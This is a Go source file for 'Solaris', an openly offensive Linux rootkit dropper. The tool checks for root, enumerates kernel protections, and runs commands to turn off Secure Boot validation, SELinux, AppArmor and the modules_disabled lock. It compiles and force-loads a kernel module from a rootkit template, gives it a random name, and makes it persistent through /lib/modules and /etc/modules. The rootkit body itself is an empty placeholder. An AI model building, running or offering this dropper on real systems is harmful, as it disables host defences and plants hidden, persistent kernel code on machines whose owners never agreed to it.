package main

import (
	"github.com/akamensky/argparse"
	"github.com/fatih/color"

	//"github.com/olekukonko/tablewriter"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"reflect"
	"strings"
	"time"

	"github.com/common-nighthawk/go-figure"
	"github.com/taion809/haikunator"
)

var red = color.New(color.FgRed).SprintFunc()
var green = color.New(color.FgGreen).SprintFunc()
var cyan = color.New(color.FgBlue).SprintFunc()
var bold = color.New(color.Bold).SprintFunc()
var yellow = color.New(color.FgYellow).SprintFunc()
var magenta = color.New(color.FgMagenta).SprintFunc()
var blue = color.New(color.FgBlue).SprintFunc()

var makefile_template = `
obj-m += ROOTKIT_NAME.o

all:
	make -C /lib/modules/KERNEL_VER/build M=$(PWD) modules
 
clean:
	make -C /lib/modules/KERNEL_VER/build M=$(PWD) clean
	rm -rf *.o *.ko *.symvers *.mod.* *.order
` 

//PLACE YOU ROOTKIT HERE
var rootkit_template = `

`

var disable_secure_boot = false
var disable_modules_disabled = false
var disable_selinux = false
var disable_apparmor = false

func f(s string, arg ...interface{}) string {
	return fmt.Sprintf(s, arg...)
}

func p() {
	fmt.Println()
}

func contains(s interface{}, elem interface{}) bool {
	arrV := reflect.ValueOf(s)
	if arrV.Kind() == reflect.Slice {
		for i := 0; i < arrV.Len(); i++ {
			if arrV.Index(i).Interface() == elem {
				return true
			}
		}
	}
	return false
}

func exit_on_error(message string, err error) {
	if err != nil {
		fmt.Printf("%s %v", red("["+message+"]"+":"), err.Error())
		cleanup()
		os.Exit(0)
	}
}

func print_good(msg string) {
	//dt := time.Now()
	//t := dt.Format("15:04")
	fmt.Printf(" %s :: %s \n", green(bold("[+]")), msg)
	p()
}

func print_info(msg string) {
	//dt := time.Now()
	//t := dt.Format("15:04")
	fmt.Printf(" [*] :: %s\n", msg)
	p()
}

func print_error(msg string) {
	//dt := time.Now()
	//t := dt.Format("15:04")
	fmt.Printf(" %s :: %s \n", red(bold("[x]")), msg)
}

func print_warning(msg string) {
	//dt := time.Now()
	//t := dt.Format("15:04")
	fmt.Printf(" %s :: %s \n", yellow(bold("[!]")), msg)
}

func print_banner() {
	banner := figure.NewFigure("Solaris", "colossal", true)
	color.Set(color.FgYellow)
	p()
	banner.Print()
	fmt.Println("")
	color.Unset()
	p()
	fmt.Println("\tCreated by: redcodelabs.io", red(bold("<*>")))
}

func random_int(min int, max int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(max-min) + min
}

func random_string(n int) string {
	rand.Seed(time.Now().UnixNano())
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func write_to_file(filename string, data string) {
	file, err := os.Create(filename)
	exit_on_error("FILE CREATION ERROR", err)
	defer file.Close()

	_, err = io.WriteString(file, data)
	exit_on_error("FILE WRITE ERROR", err)
}

func append_to_file(file string, content string) {
	f, err := os.OpenFile(file,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	defer f.Close()
	_, err = f.WriteString(content + "\n")
	exit_on_error("FILE APPEND ERROR", err)
}

func read_from_file(file string) string {
	fil, err := os.Open(file)
	exit_on_error("FILE OPEN ERROR", err)
	//defer file.Close()
	b, _ := ioutil.ReadAll(fil)
	return string(b)
}

func cmd_out(command string) (string, error) {
	cmd := exec.Command("bash", "-c", command)
	output, err := cmd.CombinedOutput()
	out := string(output)
	return out, err
}

func haikunate() string {
	h := haikunator.NewHaikunator()
	return h.DelimHaikunate("_")
}

func is_kernel_sig() string {
	out, err := cmd_out("cat /boot/config-$(uname -r)")
	if err != nil {
		return yellow("UNKNOWN")
	}
	if strings.Contains(out, "CONFIG_MODULE_SIG=y") {
		return red("ENABLED")
	}
	return green("DISABLED")
}

func is_kernel_sig_force() string {
	out, err := cmd_out("cat /boot/config-$(uname -r)")
	if err != nil {
		return yellow("UNKNOWN")
	}
	if strings.Contains(out, "CONFIG_MODULE_SIG_FORCE=y") {
		return red("ENABLED")
	}
	return green("DISABLED")
}

func is_kallsyms() string {
	out, err := cmd_out("cat /boot/config-$(uname -r)")
	if err != nil {
		return yellow("UNKNOWN")
	}
	if strings.Contains(out, "CONFIG_KALLSYMS=y") {
		return green("ENABLED")
	}
	return red("DISABLED")
}

func is_kallsyms_all() string {
	out, err := cmd_out("cat /boot/config-$(uname -r)")
	if err != nil {
		return yellow("UNKNOWN")
	}
	if strings.Contains(out, "CONFIG_KALLSYMS_ALL=y") {
		return green("ENABLED")
	}
	return red("DISABLED")
}

func is_secure_boot() string {
	out, err := cmd_out("mokutil --sb-state")
	if err != nil {
		disable_secure_boot = true
		return yellow("UNKNOWN")
	}
	if strings.Contains(out, "enabled") {
		disable_secure_boot = true
		return red("ENABLED")
	}
	return green("DISABLED")
}

func is_apparmor() string {
	out, err := cmd_out("aa-enabled")
	if err != nil {
		disable_apparmor = true
		return yellow("UNKNOWN")
	}
	if strings.Contains(out, "Yes") {
		disable_apparmor = true
		return red("ENABLED")
	}
	return green("DISABLED")
}

func is_selinux() string {
	out, err := cmd_out("sestatus")
	if err != nil {
		return green("DISABLED")
	}
	if strings.Contains(out, "enabled") {
		disable_selinux = true
		return red("ENABLED")
	}
	return green("DISABLED")
}

func is_mod_disabled() string {
	out, err := cmd_out("cat /proc/sys/kernel/modules_disabled")
	if err != nil {
		disable_modules_disabled = true
		return yellow("UNKNOWN")
	}
	if strings.Contains(out, "1") {
		disable_modules_disabled = true
		return red("ENABLED")
	}
	return green("DISABLED")
}

func install_headers(kernel_ver string) {
	pm := "apt-get install"
	if !strings.Contains("which pacman", "not") {
		pm = "pacman -S"
	}
	_, err := cmd_out(f("%s linux-headers-%s", pm, kernel_ver))
	if err != nil {
		print_error(red("Cannot install kernel headers"))
	} else {
		print_good(green("Installed kernel headers"))
	}
}

func cleanup() {
	cmd_out("rm *.ko; rm *.obj; rm Makefile; rm *.o; rm *.c")
}

func privcheck() {
	out, _ := cmd_out("id")
	if strings.Contains(out, "gid=0") {
		print_good(green("Root privileges are present"))
	} else if strings.Contains(out, "root") {
		print_warning(yellow("User is not root, but is a member of admin group"))
	} else {
		print_error(red("No root privileges detected. Rootkit insertion might be impossible"))
	}
	p()
	p()
}

func enum_sec() {
	fmt.Println(bold("| SECURITY MEASURES "))
	fmt.Println("| -> SIG          :: " + is_kernel_sig())
	fmt.Println("| -> SIG_FORCE    :: " + is_kernel_sig_force())
	fmt.Println("| -> SECURE_BOOT  :: " + is_secure_boot())
	fmt.Println("| -> APPARMOR     :: " + is_apparmor())
	fmt.Println("| -> SELINUX      :: " + is_selinux())
	fmt.Println("| -> MOD_DISABLE  :: " + is_mod_disabled())
	fmt.Println("| -> KSYMS        :: " + is_kallsyms())
	fmt.Println("| -> KSYMS_ALL    :: " + is_kallsyms_all())
	p()
}

func disable_sec() {
	if disable_secure_boot {
		_, err := cmd_out("sudo mokutil --disable-validation")
		if err != nil {
			print_error("Cannot disable secure boot: " + red(err.Error()))
		} else {
			print_good(green("Disabled secure boot"))
		}
	}
	if disable_modules_disabled {
		_, err := cmd_out("echo 0 > /proc/sys/kernel/modules_disabled")
		if err != nil {
			print_error("Cannot disable LKM insertion protection: " + red(err.Error()))
		} else {
			print_good(green("Disabled LKM insertion protection"))
		}
	}
	if disable_selinux {
		_, err := cmd_out("setenforce 0")
		if err != nil {
			print_error("Cannot disable SELinux: " + red(err.Error()))
		} else {
			print_good(green("Disabled SELinux"))
		}
	}
	if disable_apparmor {
		_, err := cmd_out("sudo systemctl disable apparmor")
		if err != nil {
			print_error("Cannot disable AppArmor: " + red(err.Error()))
		} else {
			print_good(green("Disabled AppArmor"))
		}
	}
	p()
}

func show_help() {
	msg := fmt.Sprintf(`
USAGE:
	solaris <options>

DROPPER OPTIONS:
	-k, --kernel			Target kernel version (default: %s)	
	-r, --random			Use random string to name dropped rootkit
	-e, --enum			Only enumerate active security measures and exit
	-l, --load			Load the rootkit after compilation
	--insmod			Use 'insmod' command to load a module (default: %s)
	-i, --install			Install all missing kernel headers
	-c, --cleanup			Clean all dropped files
	-p, --persist			Make the rootkit persistent

	`, green("local"), green("modprobe"))
	fmt.Println(msg)
}

func main() {
	print_banner()
	p()
	parser := argparse.NewParser("solaris", "") //, usage_prologue)
	var load *bool = parser.Flag("l", "load", &argparse.Options{Help: "Load the rootkit after compilation"})
	var force *bool = parser.Flag("f", "force", &argparse.Options{Help: "When loading the rootkit, use force method"})
	var random *bool = parser.Flag("r", "random", &argparse.Options{Help: "Use random string to name dropped rootkit "})
	//var out *string = parser.String("", "out", &argparse.Options{Help: "Target kernel version", Default: "haiku"})
	var disable *bool = parser.Flag("d", "disable", &argparse.Options{Help: "Attempt to disable detected security measures"})
	//var disable *bool = parser.Flag("", "table", &argparse.Options{Help: "Attempt to disable detected security measures"})
	var install *bool = parser.Flag("i", "install", &argparse.Options{Help: "Install kernel headers required for compilation"})
	//var install *bool = parser.Flag("", "debug", &argparse.Options{Help: "Install kernel headers required for compilation"})
	var enum_only *bool = parser.Flag("e", "enum", &argparse.Options{Help: "Install kernel headers required for compilation"})
	var clean *bool = parser.Flag("c", "cleanup", &argparse.Options{Help: "Install kernel headers required for compilation"})
	//var commands_only *bool = parser.Flag("", "commands", &argparse.Options{Help: "Install kernel headers required for compilation"})
	//var panicc *bool = parser.Flag("", "panic", &argparse.Options{Help: "The rootkit causes kernel panic when unloaded"})
	var persist *bool = parser.Flag("p", "persist", &argparse.Options{Help: "Make the rootkit persistent"})
	var insmod *bool = parser.Flag("", "insmod", &argparse.Options{Help: "Use deprecated 'insmod' command to load a module"})
	var kernel *string = parser.String("", "kernel", &argparse.Options{Help: "Target kernel version", Default: "local"})
	//var lhost *string = parser.String("", "lhost", &argparse.Options{Help: "Target kernel version", Default: local_ip})
	//var lport *string = parser.String("", "lport", &argparse.Options{Help: "Target kernel version", Default: "4444"})
	//var cmd *string = parser.String("", "cmd", &argparse.Options{Help: "Target kernel version", Default: "none"})
	//var global *bool = parser.Flag("", "global", &argparse.Options{Help: "Use deprecated 'insmod' command to load a module"})
	//var no_unload *bool = parser.Flag("", "no-unload", &argparse.Options{Help: "Use deprecated 'insmod' command to load a module"})
	//var no_unload *bool = parser.Flag("", "static-inline", &argparse.Options{Help: "Use deprecated 'insmod' command to load a module"})
	//var no_unload *bool = parser.Flag("", "verbose", &argparse.Options{Help: "Use deprecated 'insmod' command to load a module"})
	commandline_args := os.Args
	if contains(commandline_args, "-h") ||
		contains(commandline_args, "--help") ||
		len(commandline_args) == 1 {
		show_help()
		os.Exit(0)
	}
	err := parser.Parse(commandline_args)
	if err != nil {
		show_help()
		os.Exit(0)
	}
	kernel_ver, _ := cmd_out("uname -r")
	pref := "Detected"
	rootkit_name := haikunate()
	//fmt.Println(makefile_template)
	if *install {
		install_headers(*kernel)
	}
	if *random {
		rootkit_name = random_string(random_int(1, 10))
	}
	if *kernel != "local" {
		kernel_ver = *kernel
		pref = "Target"
	}

	// ################# OPTIONS REPLACEMENT
	makefile_template = strings.Replace(makefile_template, "KERNEL_VER", kernel_ver, -1)
	makefile_template = strings.Replace(makefile_template, "ROOTKIT_NAME", rootkit_name, -1)
	// ############################

	print_info(f("%s kernel version -> %s", pref, cyan(kernel_ver)))
	privcheck()
	enum_sec()
	if *disable {
		disable_sec()
	}
	if *enum_only {
		os.Exit(0)
	}
	write_to_file("Makefile", makefile_template)
	write_to_file(rootkit_name+".c", rootkit_template)
	o, err := cmd_out("make")
	if err != nil {
		print_error(red("[!!!] Compilation error: " + err.Error()))
		fmt.Println(red(o))
		cleanup()
		os.Exit(0)
	} else {
		print_good(green("Compiled module"))
	}
	loader_flags := ""
	loader_cmd := "modprobe"
	if *insmod {
		loader_cmd = "insmod"
	}
	if *force {
		loader_flags = "--force --allow-unsupported"
	}
	if *load {
		_, err := cmd_out(f("%s %s %s.ko", loader_cmd, loader_flags, rootkit_name))
		exit_on_error("CANNOT LOAD MODULE", err)
		if err != nil {
			cleanup()
		}
	}
	if *persist {
		success := true
		folder_name := haikunate()
		_, err = cmd_out("mkdir /lib/modules/$(uname -r)/" + folder_name)
		if err != nil {
			print_error("Cannot create directory for module persistence: " + err.Error())
			success = false
		}
		_, err := cmd_out(f("cp %s /lib/modules/$(uname -r)/%s/", rootkit_name+".ko", folder_name))
		if err != nil {
			print_error("Cannot copy module: " + err.Error())
			success = false
		}
		_, err = cmd_out(f(`echo %s >> /etc/modules`, rootkit_name))
		if err != nil {
			print_error("Cannot add module to /etc/modules: " + err.Error())
			success = false
		}
		if success {
			print_good("Successfully obtained persistence")
		}
	}
	if *clean{
		cleanup()
	}
}
